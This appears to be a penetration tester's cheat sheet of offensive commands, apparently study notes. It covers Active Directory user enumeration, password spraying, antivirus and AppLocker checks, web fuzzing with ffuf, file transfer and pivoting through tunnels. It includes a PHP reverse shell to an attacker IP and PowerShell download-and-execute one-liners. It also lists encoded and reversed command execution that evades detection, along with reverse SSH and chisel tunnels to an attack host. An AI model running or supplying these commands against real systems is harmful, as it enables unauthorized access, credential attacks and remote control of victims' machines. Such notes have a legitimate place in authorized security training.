# Cheatsheet

| Command                                                                                                      | Description                                            |
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------ |
| `fping -asgq <subnet/cidr>`                                                                                  | Quick way to ping all hosts in a subnet on kali.       |
| `./kerbrute userenum -d <Domain> --dc <dc IP> <username wordlist> -o <result output>`                        | Kerbrute userenum syntax, given a username wordlist    |
| `crackmapexec smb <IP address> -u <username> -p <password> --pass-pol`                                       | Crackmapexec with valid creds to eval password policy. |
| `rpcclient -U "" -N <IP address> rpcclient $> enumdomuser`                                                   | RPC Client NULL authentication enum domain users.      |
| `net accounts`                                                                                               | Enum password policy on Windows                        |
| `crackmapexec smb <IP address> --users`                                                                      | CrackMapExec to find users in Windows domain           |
| `kerbrute passwordspray -d <Domain> --dc <IP Address> <users.txt> <password>`                                | Kerbrute password spray                                |
| `sudo crackmapexec smb <IP Address> -u <users.txt> -p <password> \| grep +`                                  | CrackMapExec password spray                            |
| `Get-MpComputerStatus`                                                                                       | Check AntiVirus                                        |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                                   | Check App Locker.                                      |
| `$ExecutionContext.SessionState.LanguageMode`                                                                | Find PowerShell Language Mode                          |
| `sudo crackmapexec smb <IP address> -u <username> -p <password> --users`                                     | Authenticated scan for more users.                     |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --groups`                                        | Authenticated scan for more groups.                    |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --loggedon-users`                                | Authenticated scan for logged on users.                |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --shares`                                        | Authenticated scan for shares.                         |
| `sudo crackmapexec smb <IP address> -u <user> -p <passowrd -M spider_plus --share <share>`                   | Authenticated scan to crawl target share               |
| `smbmap -u <user> -p <passowrd> -d <domain> -H <IP address>`                                                 | Authenticated scan to list shares.                     |
| `sudo bloodhound-python -u <user> -p <password> -ns <nameserver IP> -d <domain> -c all`                      | Authenticated Bloodhound all.                          |
| `"IEX(New-Object Net.WebClient).downloadString('<URL>')"`                                                    | PowerShell one-liner used to download a file.          |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");`                                         | PHP reverse shell                                      |
| `sudo python3 joomla-brute.py -u <url> -w <password list> -usr <username or user list>`                      | Joomla brute script                                    |
| **Reversed Commands**                                                                                        |                                                        |
| `echo 'whoami' \| rev`                                                                                       | Reverse a string                                       |
| `$(rev<<<'imaohw')`                                                                                          | Execute reversed command                               |
| **Encoded Commands**                                                                                         |                                                        |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`                                                             | Encode a string with base64                            |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`                                                 | Execute b64 encoded string                             |
| **Reversed Commands**                                                                                        |                                                        |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                                       |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                               |
| **Encoded Commands**                                                                                         |                                                        |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64                            |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string                             |
## Ffuf
| **Command**                                                                                                                                       | **Description**          |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                                         | Directory Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                                    | Extension Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ.php`                                                                                     | Page Fuzzing             |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                                | Recursive Fuzzing        |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.URL/`                                                                                                  | Sub-domain Fuzzing       |
| `ffuf -w wordlist.txt:FUZZ -u http://URL:PORT/ -H 'Host: FUZZ.URL' -fs FILE-SIZE`                                                                 | VHost Fuzzing            |
| `ffuf -w wordlist.txt:FUZZ -u http://URL:PORT/login.php?FUZZ=key -fs FILE-SIZE`                                                                   | Parameter Fuzzing - GET  |
| `ffuf -w wordlist.txt:FUZZ -u http://URL:PORT/login.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs FILE-SIZE` | Parameter Fuzzing - POST |
| `ffuf -w ids.txt:FUZZ -u http://URL:PORT/login.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs FILE-SIZE`       | Value Fuzzing            |
## File transfers
| **Command**                                                                                                        | **Description**                              |
| ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| `Invoke-WebRequest <URL> -OutFile <output filename>`                                                               | Download a file                              |
| `IEX (New-Object Net.WebClient).DownloadString('<URL>')`                                                           | Execute a file in memory                     |
| `Invoke-WebRequest -Uri <URL> -Method POST -Body $b64`                                                             | Upload a file                                |
| `bitsadmin /transfer n <URL> <OUTPUT PATH>`                                                                        | Download a file using Bitsadmin              |
| `certutil.exe -verifyctl -split -f <URL>`                                                                          | Download a file using Certutil               |
| `wget <URL> -O <OUTPUT PATH>`                                                                                      | Download a file using Wget                   |
| `curl -o <OUTPUT PATH> <URL>`                                                                                      | Download a file using cURL                   |
| `php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILENAME>",$file);'`                              | Download a file using PHP                    |
| `Invoke-WebRequest <URL> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Firefox -OutFile "<OUTPUT FILE>"` | Invoke-WebRequest using a Firefox User Agent |
## Tunneling
| **Command**                                                                                                                          | **Description**                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| `ssh -L <LOCAL_PORT>:localhost:<REMOTE_PORT> <USERNAME>@<IP>`                                                                        | SSH Tunnel Setup: Create SSH tunnels to forward local ports to remote ports                           |
| `nmap -v -sV -p<LOCAL_PORT> localhost`                                                                                               | Scan locally forwarded port                                                                           |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                             | Dynamic port forwarding Socks4.                                                                       |
| `ssh -R <InternalIPofPivotHost>:<ATTACK_PORT>:0.0.0.0:<TARGET_PORT> <USERNAME>@<ipAddressofTarget> -vN`                              | Reverse SSH tunnel from a target to an attack host.                                                   |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=<SUBNET>`                                                                             | Ping sweep module against the specified subnet.                                                       |
| `netsh.exe interface portproxy add <NAME> listenport=<PORT> listenaddress=<IP> connectport=<REMOTE_PORT> connectaddress=<REMOTE_IP>` | netsh called `NAME` that listens on port `PORT`, forwarding connections to `REMOTE_IP`:`REMOTE_PORT`. |
| `netsh.exe interface portproxy show <NAME>`                                                                                          | view the configurations of a portproxy rule.                                                          |
| `./chisel server -v -p 1080 --socks5`                                                                                                | chisel server in verbose mode SOCKS5.                                                                 |
| `./chisel client -v <ATTACK_IP>:1080 socks`                                                                                          | connect to a chisel server.                                                                           |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                               | register the SocksOverRDP-PLugin.dll.                                                                 |